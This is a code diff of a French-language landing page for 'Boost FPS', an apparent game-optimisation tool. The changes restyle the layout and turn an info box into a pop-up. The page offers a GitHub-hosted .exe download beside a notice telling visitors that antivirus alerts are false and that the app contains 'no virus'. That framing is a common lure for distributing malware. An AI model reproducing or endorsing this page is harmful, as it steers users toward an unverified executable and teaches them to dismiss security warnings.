@@ -17,13 +17,17 @@
             color: #333;
             line-height: 1.6;
             font-size: 16px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
         }
 
         .container {
             width: 90%;
             max-width: 1000px;
-            margin: 0 auto;
+            margin: auto;
             padding: 20px;
+            flex: 1;
         }
 
         header {
@@ -35,7 +39,7 @@
         }
 
         header h1 {
-            font-size: 2.5em;
+            font-size: 2.2em;
             font-weight: bold;
         }
 
@@ -112,8 +116,56 @@
             cursor: pointer;
         }
 
-        .hidden {
+        /* Style de la fenêtre pop-up */
+        .popup {
             display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            width: 90%;
+            max-width: 500px;
+            padding: 20px;
+            text-align: center;
+            z-index: 1000;
+        }
+
+        .popup h2 {
+            margin-bottom: 10px;
+        }
+
+        .popup p {
+            font-size: 0.9em;
+            color: #333;
+        }
+
+        .popup .close-btn {
+            background: #ff6f61;
+            color: white;
+            border: none;
+            padding: 10px;
+            margin-top: 10px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .popup .close-btn:hover {
+            background: #ff4c3b;
+        }
+
+        /* Fond noir derrière la pop-up */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 900;
         }
 
         footer {
@@ -147,11 +199,7 @@
             
             <div class="antivirus-warning">
                 <p><strong>Avis important :</strong> Certains antivirus peuvent détecter notre application comme une menace à cause de la manière dont elle optimise les performances. <br>
-                <strong><a href="#" onclick="toggleInfo()">En savoir plus</a></strong></p>
-            </div>
-
-            <div id="info" class="hidden">
-                <p>Notre application utilise des scripts d'optimisation avancés, ce qui peut parfois être considéré comme suspect par les antivirus. Il n'y a aucun virus, seulement des optimisations pour améliorer votre expérience de jeu.</p>
+                <strong><a href="#" onclick="openPopup()">En savoir plus</a></strong></p>
             </div>
 
             <a href="https://github.com/seyzperly572/New/releases/download/boostfps/boostfps2.0.exe" download="boostfps2.0.exe" class="download-button">Télécharger</a>
@@ -174,6 +222,14 @@
         <p>&copy; 2025 Boost FPS. Optimise tes jeux maintenant !</p>
     </footer>
 
+    <!-- Fenêtre pop-up -->
+    <div class="overlay" id="overlay" onclick="closePopup()"></div>
+    <div class="popup" id="popup">
+        <h2>Pourquoi mon antivirus détecte Boost FPS ?</h2>
+        <p>Notre application utilise des scripts d'optimisation avancés, ce qui peut parfois être considéré comme suspect par les antivirus. Il n'y a aucun virus, seulement des optimisations pour améliorer votre expérience de jeu.</p>
+        <button class="close-btn" onclick="closePopup()">Fermer</button>
+    </div>
+
     <script>
         function showSection(sectionId) {
             document.querySelectorAll('.section').forEach(section => {
@@ -182,9 +238,14 @@
             document.getElementById(sectionId).classList.add('active');
         }
 
-        function toggleInfo() {
-            let info = document.getElementById("info");
-            info.classList.toggle("hidden");
+        function openPopup() {
+            document.getElementById("popup").style.display = "block";
+            document.getElementById("overlay").style.display = "block";
+        }
+
+        function closePopup() {
+            document.getElementById("popup").style.display = "none";
+            document.getElementById("overlay").style.display = "none";
         }
     </script>
 
